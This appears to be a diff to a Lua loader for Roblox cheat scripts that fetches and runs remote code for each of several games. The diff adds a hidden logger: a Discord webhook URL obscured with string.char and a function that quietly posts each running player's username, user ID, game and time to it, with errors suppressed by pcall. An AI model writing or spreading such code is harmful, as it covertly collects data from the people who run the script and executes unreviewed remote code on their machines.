@@ -1,21 +1,80 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local WEBHOOK_URL = string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,57,57,53,55,51,53,54,50,49,54,55,49,55,52,55,50,47,79,107,102,72,100,112,50,113,78,68,80,112,84,109,114,102,88,80,50,114,54,72,121,120,86,90,122,69,52,100,113,106,110,77,45,82,71,115,82,73,99,53,74,72,113,51,116,83,104,75,45,122,53,80,121,115,48,95,65,48,121,85,57,120,70,118,104,84)
+
+local function sendExecutionLog(gameName)
+    local username = player.Name
+    local displayName = player.DisplayName
+    local userId = player.UserId
+    local gameId = game.GameId
+    local placeName = game.Name
+    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "Sakura Execution",
+            ["description"] = "**Someone just executed the loader!**",
+            ["color"] = 16761035,
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = username .. " (@" .. displayName .. ")", ["inline"] = true},
+                {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
+                {["name"] = "Game", ["value"] = placeName .. " (" .. gameName .. ")", ["inline"] = false},
+                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
+                {["name"] = "Time", ["value"] = timestamp, ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "Sakura Logger 💕"}
+        }}
+    }
+
+    local requestFunc = syn and syn.request or http_request or request or http.request
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+local function onScriptLoad(gameName)
+    sendExecutionLog(gameName)
+end
+
 task.spawn(function()
     local GameId = game.GameId
-
     print("Detected Game ID:", GameId)
 
     if GameId == 372226183 then -- FLEE THE FACILITY
+        onScriptLoad("Flee The Facility")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/flee-the-facility.lua"))()
-    elseif GameId == 8497165255 then --SPIN A BRAINROT
+
+    elseif GameId == 8497165255 then -- SPIN A BRAINROT
+        onScriptLoad("Spin A Brainrot")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/spin-a-brainrot.lua"))()
-    elseif GameId == 6701277882 then --FISH IT
+
+    elseif GameId == 6701277882 then -- FISH IT
+        onScriptLoad("Fish It")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/fish-it.lua"))()
-    elseif GameId == 6739698191 then --VIOLENCE DISTRICT
+
+    elseif GameId == 6739698191 then -- VIOLENCE DISTRICT
+        onScriptLoad("Violence District")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/vd"))()
-    elseif GameId == 7671049560 then --THE FORGE
+
+    elseif GameId == 7671049560 then -- THE FORGE
+        onScriptLoad("The Forge")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/the_forge.lua"))()
-    elseif GameId == 9266873836 then --ANIME FIGHTING SIMULATOR ENDLESS
+
+    elseif GameId == 9266873836 then -- ANIME FIGHTING SIMULATOR ENDLESS
+        onScriptLoad("Anime Fighting Simulator: Endless")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/inosuke-creator/gna-gits/refs/heads/main/afse.lua"))()
+
     else
         warn("⚠️ No script found for this Game ID:", GameId)
+        onScriptLoad("Unknown Game")
     end
 end)
